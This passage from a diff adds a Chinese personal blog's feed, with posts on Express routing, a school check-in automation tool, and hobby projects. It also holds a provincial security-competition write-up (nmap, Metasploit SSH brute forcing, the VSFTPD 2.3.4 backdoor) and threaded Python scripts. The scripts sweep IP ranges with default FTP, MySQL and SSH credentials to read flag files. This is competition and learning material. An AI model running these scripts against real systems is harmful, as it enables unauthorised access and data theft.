class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.get(&#x27;/&#x27;,function(request, response)&#123;</span></span><br><span class="line"><span class="comment">// response.send(&quot;Hello，欢迎进入使用express搭建的服务器&quot;);</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">request, response</span>)&#123;</span><br><span class="line"><span class="comment">// response.send(&quot;Hello，欢迎进入使用express搭建的服务器&quot;);</span></span><br><span class="line">response.<span class="title function_">render</span>(<span class="string">&#x27;./shopping.ejs&#x27;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>方法2、</strong><br>注释server.js目录下的send()方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.get(&#x27;/&#x27;,function(request, response)&#123;</span></span><br><span class="line"><span class="comment">// response.send(&quot;Hello，欢迎进入使用express搭建的服务器&quot;);</span></span><br></pre></td></tr></table></figure><p>并配置路由文件下的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义购物车路径为首页</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">request,response</span>)&#123;  </span><br><span class="line"><span class="comment">// render()表示‘渲染’，并指定页面的来源是shopping.ejs</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220411191839.png" alt="show.js"></p><h3 id="页面跳转"><a href="#页面跳转" class="headerlink" title="页面跳转"></a>页面跳转</h3><p>设置route路径，，，然后在需要跳转的地方直接写路由页面路径。<br><a href="/bt"></a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义bt页面路径</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/bt&#x27;</span>,<span class="keyword">function</span>(<span class="params">request,response</span>)&#123;  </span><br><span class="line"><span class="comment">// render()表示‘渲染’，并指定页面的来源是shopping.ejs</span></span><br><span class="line">response.<span class="title function_">render</span>(<span class="string">&#x27;./bt.ejs&#x27;</span>);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="启动node-js服务器"><a href="#启动node-js服务器" class="headerlink" title="启动node.js服务器"></a>启动node.js服务器</h3><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220411192005.png" alt="ipconfig"><br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220411192028.png" alt="node"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="默认分类" scheme="https://blog.thecat.top/categories/%E9%BB%98%E8%AE%A4%E5%88%86%E7%B1%BB/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>日精进打卡新增邮件通知功能</title>
+    <link href="https://blog.thecat.top/archives/rjjpush.html"/>
+    <id>https://blog.thecat.top/archives/rjjpush.html</id>
+    <published>2022-04-06T22:35:00.000Z</published>
+    <updated>2023-07-07T08:08:54.873Z</updated>
+    
+    <content type="html"><![CDATA[<!--markdown--># 邮件通知<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220407143352.jpg" alt="邮件通知"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+    <category term="代码" scheme="https://blog.thecat.top/tags/%E4%BB%A3%E7%A0%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>足下教育日精进自动打卡.exe</title>
+    <link href="https://blog.thecat.top/archives/rjj.exe.html"/>
+    <id>https://blog.thecat.top/archives/rjj.exe.html</id>
+    <published>2022-04-04T00:29:00.000Z</published>
+    <updated>2023-07-07T07:59:18.117Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="我为啥会写这个程序呢？？？"><a href="#我为啥会写这个程序呢？？？" class="headerlink" title="我为啥会写这个程序呢？？？"></a>我为啥会写这个程序呢？？？</h3><p>日精进，一切为了折磨大学生！<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/QQ%E5%9B%BE%E7%89%8720220404163456.jpg" alt="起因"></p><p>像我这么健忘，，，天天被追着催，，，可就太难受； 了。<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/006APoFYly1g28bga1djkj30ei08yt91.jpg" alt="emo.jpg"></p><p>于是开始盯着小程序看，，，最终决定编写程序。<br>三月二号下午，足下教育现代化学习平台小程序成长系统日精进定时自动提交程序第一稿成功了。<br>三号出现BUG闪退，，，一直没解决，，，<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/006dMd5bgy1gxw0eg6y29j30go0gomzu.jpg" alt="debug"><br>四号早上测试还是闪退，中午下课淦完饭，回宿舍继续认真分析数据最终定位导致闪退的bug，，，四号下午修复完毕！！！<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/9150e4e5gw1f9bm70nqhjj203c02agle.jpg" alt="he"></p><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/2022-04-04%20171240.png" alt="demo"></p><p>请勿短时间内提交多次！！！</p><p>如何使用？？？<br>直接挂在远程服务器上运行程序即可》》》</p><h1 id="低调使用！"><a href="#低调使用！" class="headerlink" title="低调使用！"></a>低调使用！</h1><p>如何下载《足下日精进自动打卡.exe》？？？<br>微信关注“白菜大侠”公众号 回复 “rjj” 获取下载链接。</p><h1 id="卡密获取："><a href="#卡密获取：" class="headerlink" title="卡密获取："></a>卡密获取：</h1><p>1、微信公众号关注：白菜大侠<br>2、回复“km”  即可解锁程序。<br>演示<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20220404174103.jpg" alt="指令"></p><p>邮件通知功能<br>有时间会更新一个打卡状态邮件通知的功能，<br>echo 系统会向您提供的邮箱发送一封打卡是否成功的通知！！</p><h1 id="BUG修复"><a href="#BUG修复" class="headerlink" title="BUG修复"></a>BUG修复</h1><p>每次打开时间-1h，就tm离谱。<br><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/%E6%89%B9%E6%B3%A8%202022-04-10%20163756.png" alt="BUG"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+    <category term="代码" scheme="https://blog.thecat.top/tags/%E4%BB%A3%E7%A0%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【展板】作品设计展</title>
+    <link href="https://blog.thecat.top/archives/zpz.html"/>
+    <id>https://blog.thecat.top/archives/zpz.html</id>
+    <published>2022-02-11T23:20:00.000Z</published>
+    <updated>2023-07-07T08:24:21.635Z</updated>
+    
+    <content type="html"><![CDATA[<!--markdown-->![展示][1]]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="平面设计" scheme="https://blog.thecat.top/categories/%E5%B9%B3%E9%9D%A2%E8%AE%BE%E8%AE%A1/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>【项目】一款简洁的告白墙</title>
+    <link href="https://blog.thecat.top/archives/gbqlz.html"/>
+    <id>https://blog.thecat.top/archives/gbqlz.html</id>
+    <published>2021-11-11T19:52:00.000Z</published>
+    <updated>2023-07-07T08:20:19.342Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p> 这是一个隐秘的私密空间,既为你的爱情铺路,也见证你的爱情路程,很期待与你的每一次相遇。</p><h1 id="项目展示"><a href="#项目展示" class="headerlink" title="项目展示"></a>项目展示</h1><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/IST_21327_00064.jpg" alt="项目展示"></p><p>开发文档<br><a href="https://lovewalldoc.thecat.top/">https://lovewalldoc.thecat.top</a></p><p><a href="https://ynftclove.thecat.top/index.php">https://ynftclove.thecat.top/index.php</a>“</p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+    <category term="告白墙" scheme="https://blog.thecat.top/tags/%E5%91%8A%E7%99%BD%E5%A2%99/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2021年5月云南省网络空间安全比赛赛题</title>
+    <link href="https://blog.thecat.top/archives/202105aq.html"/>
+    <id>https://blog.thecat.top/archives/202105aq.html</id>
+    <published>2021-10-09T16:22:41.000Z</published>
+    <updated>2023-07-07T07:30:34.698Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="2021年5月云南省网络空间安全赛项技能大赛比赛赛题复现。"><a href="#2021年5月云南省网络空间安全赛项技能大赛比赛赛题复现。" class="headerlink" title="2021年5月云南省网络空间安全赛项技能大赛比赛赛题复现。"></a>2021年5月云南省网络空间安全赛项技能大赛比赛赛题复现。</h1><h2 id="任务一、SSH弱口令渗透测试"><a href="#任务一、SSH弱口令渗透测试" class="headerlink" title="任务一、SSH弱口令渗透测试"></a>任务一、SSH弱口令渗透测试</h2><p>任务环境说明：<br>ü 服务器场景：Linux<br>ü 服务器场景操作系统：Linux（版本不详）</p><ol><li>在本地PC渗透测试平台BT5中使用zenmap工具扫描服务器场景Linux所在网段(例如：172.16.101.0&#x2F;24)范围内存活的主机IP地址和指定开放的21、22、23端口。并将该操作使用的命令中必须要添加的字符串作为FLAG提交（忽略ip地址）；</li></ol><p>直接用nmap扫描</p><p>flag&#x3D;-p21,22,23</p><p>2.通过本地PC中渗透测试平台BT5对服务器场景Linux进行系统服务及版本扫描渗透测试，并将该操作显示结果中SSH服务对应的服务端口信息作为FLAG提交；</p><p>nmap -sV 192.168.19.75<br>flag&#x3D;22&#x2F;tcp</p><p>3.在本地PC渗透测试平台BT5中使用MSF模块对其爆破，使用search命令，并将扫描弱口令模块的名称信息作为FLAG提交；</p><p>flag&#x3D;search mssql_login</p><ol start="4"><li>在上一题的基础上使用命令调用该模块，并查看需要配置的信息（使用show options命令），将回显中需要配置的目标地址,密码使用的猜解字典,线程,账户配置参数的字段作为FLAG提交（之间以英文逗号分隔，例hello,test，..,..）；</li></ol><p>flag&#x3D;rhosts,pass_file,threads,username</p><p>5.在msf模块中配置目标靶机IP地址，将配置命令中的前两个单词作为FLAG提交；</p><p>flag&#x3D;set rhosts</p><ol start="6"><li>在msf模块中指定密码字典，字典路径为&#x2F;root&#x2F;2.txt，用户名为test爆破获取密码并将得到的密码作为FLAG提交；<br>直接用比赛现场的字典进行爆破爆破，使用set指定参数，直接run就行   。</li></ol><p>在上一题的基础上，使用第6题获取到的密码SSH到靶机，将test用户家目录中唯一一个后缀为.bmp图片的文件名的字符串作为FLAG提交。<br>迎刃而解</p><h2 id="任务二：数据分析ack数据包"><a href="#任务二：数据分析ack数据包" class="headerlink" title="任务二：数据分析ack数据包"></a>任务二：数据分析ack数据包</h2><p>1.从靶机服务器的FTP上下载attack pcapng数据包文件,通过分析数据包attack pcapng,找出黑客的IP地址，并将黑客的IP地址作为FLAG (形式: [IP地址])提交; (1分)</p><p>flag：[192.168.8.126]</p><p>2继续查看数据包文件attack.pacapng,分析出黑客扫描得到的靶机开放的端口,将靶机开放的端口作为FLAG (形式: [端口名1,端口名2.端口名3… ,端口名n])从低到高提交; (1分)</p><p>flag：[21]</p><p>3.继续查看数据包文件attack pacapng,分析出黑客成功入侵后获得的操作系统的版本号，将操作系统的版本号作为FLAG (形式: [操作系统版本号])提交; (1分)</p><p>flag:[ anonymous]</p><p>4.继续查看数据包文件attack pacapng,分析出黑客成功入侵后执行的第一条命令 ,并将执行的第一条命令作为FLAG (形式: [第-条命令])提交; (1分)</p><p>flag:[admin]</p><p>5.继续查看数据包文件attack.pacapng,分析出黑客成功入侵后执行的第二条命令,并将执行的第二条命令作为FLAG (形式: [第二条命令])提交; (2分) </p><p>flag:[put one.asp]</p><p>6.继续查看数据包文件attack pacapng,分析出黑客成功入侵后执行的第二条命令的返回结果,并将执行的第二条命令返回结果作为FLAG (形式: [第二条命令返回结果])提交; (2分)</p><p>flag:[Microsof-1IS&#x2F;7.5]</p><p>7.继续查看数据包文件attack .pacapng,分析出黑客成功入侵后执行的第三条命令的返回结果,并将执行的第三条命令返回结果作为FLAG (形式: [第三条命令返回结果])提交。(2分)</p><p>flag:[Tomorrow]</p><h2 id="任务三：综合渗透测试"><a href="#任务三：综合渗透测试" class="headerlink" title="任务三：综合渗透测试"></a>任务三：综合渗透测试</h2><p>主要内容就是使用木马进行提权获取主机Shell</p><p>大概思路：登陆后台，msf生成php马反弹拿系统权限</p><h2 id="任务四：Web渗透"><a href="#任务四：Web渗透" class="headerlink" title="任务四：Web渗透"></a>任务四：Web渗透</h2><p>页面1，，，f12直接拿flag<br>页面2，，，看到登录框，，’号报错，，直接nmap脱裤，，拿到flag。<br>页面3，，XFF伪造IP本地访问。。。<br>页面4，，记不起来了，，，很简单</p><p><em>前4小题，，都是基础，，很简单。</em></p><p>页面五，，，，&#x2F;file&#x3D;text.txt，，，这题没有做出来</p><h2 id="混战阶段"><a href="#混战阶段" class="headerlink" title="混战阶段"></a>混战阶段</h2><p>一台Linux</p><p>开放21 22 23 80 3306端口。。。<br>扫出来，，，21 ——&gt;&gt; VSFTPD234  笑脸漏洞存在。。<br>2.txt万能字典（相对较多，，拿去爆破ssh和ftp应该都能爆破出来）<br>password.txt字典。。。</p><p>二阶段总结：上场一定要记得更改虚拟机配置，不然你会卡到怀疑人生！！！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="网络安全" scheme="https://blog.thecat.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="CTF" scheme="https://blog.thecat.top/tags/CTF/"/>
+    
+    <category term="安全" scheme="https://blog.thecat.top/tags/%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="比赛" scheme="https://blog.thecat.top/tags/%E6%AF%94%E8%B5%9B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>关于比赛我的碎碎念</title>
+    <link href="https://blog.thecat.top/archives/bsssn.html"/>
+    <id>https://blog.thecat.top/archives/bsssn.html</id>
+    <published>2021-10-03T06:35:00.000Z</published>
+    <updated>2023-07-07T08:09:58.835Z</updated>
+    
+    <content type="html"><![CDATA[<!--markdown-->对于中职打了两年信息类比赛的我，升入高职放弃比赛，转战专升本升学是一种什么样的体验？？？<p>（五年制大专）中专的时候老师说，去到高职你们有比赛经验的可以优先考虑，<br>但是升入高职我发现，我们还没转段就已经选好了参赛选手。导致我们升学上来的很难被选手去比赛。<br>然后想要参加的信息安全管理与评估赛项，去年好像听学长说取消了，以后都没有这个赛项了。<br>这个就很扎心。因为中职想着学好专业技能就能靠它升学。</p><p>现在没有信息安全这个赛项，我硬着头皮去报了一个我从来没有接触过的赛项（移动应用开发），<br>因为JAVA Android开发，本身中专的时候就停课打比赛，导致java学了一般就停课备赛，不过有利有弊吧。<br>不会JAVA导致我真的很自卑，机会把握不住。（基本上JAVA现在我是从零开始学，跟同学的差距真很大），<br>在校得时间只有一年，一年后就要准备专升本考试，即使我花时间花精力去备赛去学习最后如果没有拿到比赛资格，<br>那么我浪费的时间和精力全都可以说白费，</p><p>接下来就得准备专升本，那么备赛已经浪费我很多时间了，留给我准备专升本的时间也就不多了，。</p><p>比赛年年有考虑了很多比赛能不能去无所谓（不服输！！！）。但是当下最重要的是开始了解专升本的政策和考点。<br>Java肯定是要保证每天的2小时学习效率，因为不想以后有类似的赛事 自己因为不懂而错失。。。</p><p>我对比赛升学已经不抱太大的希望了，因为一年时间我不能再去做一些看不到结果的事情。</p><p>至今开学已经有一个多月了吧，因为某些原因请假半个月。，我发现我学的很多专业课的知识，竟不能很好的衔接老师所讲的内容。，，，很自卑呀！！！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="生活随笔" scheme="https://blog.thecat.top/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>中职网络空间安全批量拿Flag脚本</title>
+    <link href="https://blog.thecat.top/archives/PyGetFlag.html"/>
+    <id>https://blog.thecat.top/archives/PyGetFlag.html</id>
+    <published>2021-07-13T16:53:00.000Z</published>
+    <updated>2023-07-07T08:05:09.687Z</updated>
+    
+    <content type="html"><![CDATA[<!--markdown-->FTP<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ftpconnect</span>(<span class="params">host,username,password,remotepath,localpath</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            ftp = FTP()</span><br><span class="line">            ftp.connect(host,<span class="number">21</span>)</span><br><span class="line">            ftp.login(username,password)</span><br><span class="line">            bufsize = <span class="number">1024</span></span><br><span class="line">            fp = <span class="built_in">open</span>(localpath,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">            ftp.retrbinary(<span class="string">&#x27;RETR &#x27;</span>+ remotepath, fp.write,bufsize)</span><br><span class="line">            ftp.set_debuglevel(<span class="number">0</span>)</span><br><span class="line">            ftp.quit()</span><br><span class="line">            fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            fp.write(host)</span><br><span class="line">            fp.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">120</span>):</span><br><span class="line">                ip = <span class="string">&#x27;10.124.0.&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">                p=threading.Thread(target=ftpconnect,args=(ip,<span class="string">&#x27;ftp&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;/a.txt&#x27;</span>))</span><br><span class="line">                p.start()</span><br></pre></td></tr></table></figure><p>MySql</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> MySQLdb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">con</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        con=MySQLdb.connect(host=ip,user=<span class="string">&#x27;root&#x27;</span>,passwd=<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">        cur=con.cursor()</span><br><span class="line">        sql=<span class="string">&quot;select load_file(&#x27;/root/flagvalue.txt&#x27;);&quot;</span> //flag存放位置</span><br><span class="line">        cur.execute(sql)</span><br><span class="line">        re=cur.fetchall()</span><br><span class="line">        <span class="built_in">print</span> ip,re</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> er:</span><br><span class="line">        <span class="built_in">print</span> er</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">th</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">220</span>):</span><br><span class="line">        ip=<span class="string">&#x27;172.16.%s.101&#x27;</span> %i</span><br><span class="line">        t=threading.Thread(target=con,args=(ip,))</span><br><span class="line">        t.start()</span><br><span class="line">th()</span><br></pre></td></tr></table></figure><p>NC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span>    commands</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>,<span class="number">10010</span>):</span><br><span class="line">            a=commands.getstatusoutput(<span class="string">&#x27;nc -w 3 &#x27;</span>+ip+<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(p)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;&lt;/root/cmd.txt&#x27;</span>)</span><br><span class="line">            <span class="comment">#/root/cmd.txt是本地的一个文件里面是执行命令</span></span><br><span class="line">            <span class="keyword">if</span> a[<span class="number">0</span>]==<span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span> (ip+<span class="string">&#x27; flag: &#x27;</span>+a[<span class="number">1</span>])</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        ip=<span class="string">&#x27;192.168.105.&#x27;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">        q=threading.Thread(target=get,args=(ip))</span><br><span class="line">        q.start()</span><br></pre></td></tr></table></figure><p>SSH</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssh2</span>(<span class="params">ip,username,passwd,cmd</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh=paramiko.SSHClient()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        ssh.connect(ip,<span class="number">22</span>,username,passwd,timeout=<span class="number">5</span>)</span><br><span class="line">        stdin,stdout,stderr=ssh.exec_command(cmd)</span><br><span class="line">        stdin.write(<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">        out = stdout.read()</span><br><span class="line">        <span class="built_in">print</span> out </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s \t OK \n&#x27;</span> %(ip)</span><br><span class="line">        aa = <span class="built_in">open</span>(<span class="string">&quot;abc.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">        aa.write(ip)</span><br><span class="line">        aa.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        aa.write(out)</span><br><span class="line">        aa.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s \t Error \n&#x27;</span> %(ip)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cmd = <span class="string">&quot;cat /root/flag.txt&quot;</span></span><br><span class="line">    username = <span class="string">&quot;root&quot;</span></span><br><span class="line">    passwd =<span class="string">&quot;123456&quot;</span></span><br><span class="line">    threads=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>,<span class="number">30</span>):</span><br><span class="line">        ip = <span class="string">&#x27;10.124.0.&#x27;</span> +<span class="built_in">str</span>(i)</span><br><span class="line">        a=threading.Thread(target=ssh2,args=(ip,username,passwd,cmd))</span><br><span class="line">        a.start()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html"></summary>
+      
+    
+    
+    
+    <category term="代码如诗" scheme="https://blog.thecat.top/categories/%E4%BB%A3%E7%A0%81%E5%A6%82%E8%AF%97/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Python-GUI</title>
+    <link href="https://blog.thecat.top/archives/Python-GUI.html"/>
+    <id>https://blog.thecat.top/archives/Python-GUI.html</id>
+    <published>2021-06-24T20:56:41.000Z</published>
+    <updated>2023-07-07T07:49:35.995Z</updated>
+    
+    <content type="html"><![CDATA[<div class="tag-plugin quot"><p class="content" type="text">Stellar 学不会啊吧 留不住她</p></div><p>基于对象的Java GUI好难学，，<br>每次都要创建对象。。。真烦，，<br>既然JAVA学不会我就尝试用Python写个图形化把。。</p><div class="tag-plugin quot"><p class="content" type="text">Stellar 模块</p></div><p>import datetime<br>from tkinter import *  # 导入</p><div class="tag-plugin quot"><p class="content" type="text">Stellar 代码</p></div><div class="tag-plugin note" ><div class="title"><strong>[title] [color:color] [child:codeblock/tabs]</strong></div><div class="body"><p>import datetime<br>from tkinter import *  # 导入</p><h1 id="gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-时间计算"><a href="#gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-时间计算" class="headerlink" title="&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;时间计算"></a>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;时间计算</h1><p>new_date &#x3D; datetime.datetime.now()  # 现在时间<br>data_str &#x3D; new_date.strftime(‘%Y-%m-%d %H:%M:%S’)  # 格式化时间<br>oneDay &#x3D; datetime.datetime(2022, 05, 20, 22, 48 ,00)  # 认识的时间<br>difference &#x3D; new_date.toordinal() - oneDay.toordinal()<br>tk &#x3D; Tk()  # 实例化主窗口<br>tk.geometry(“600x480”)  # 设置窗口大小<br>tk.title(“拾光”)  # 设置窗口标题</p><h1 id="gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-赋值"><a href="#gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-赋值" class="headerlink" title="&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;赋值"></a>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;赋值</h1><p>str0 &#x3D; “拾光机”.center(30,’+’)<br>str1 &#x3D; ‘相识于：{}\n当前时间：{}’.format(oneDay,data_str)<br>str2 &#x3D; ‘拾光机：{}天’.format(difference)<br>str3 &#x3D; ‘时光不老，我们不散’<br>str4 &#x3D; ‘陪伴是最长情的告白’<br>str5 &#x3D; “”.center(30,’+’)</p><h1 id="gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-输出"><a href="#gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-gt-输出" class="headerlink" title="&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;输出"></a>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;输出</h1><p>text &#x3D; Label(tk, text&#x3D;”\n拾光机器”, font&#x3D;”Times 33 bold”).pack()<br>textt &#x3D; Label(tk, text&#x3D;”\n我们相识：\n”, 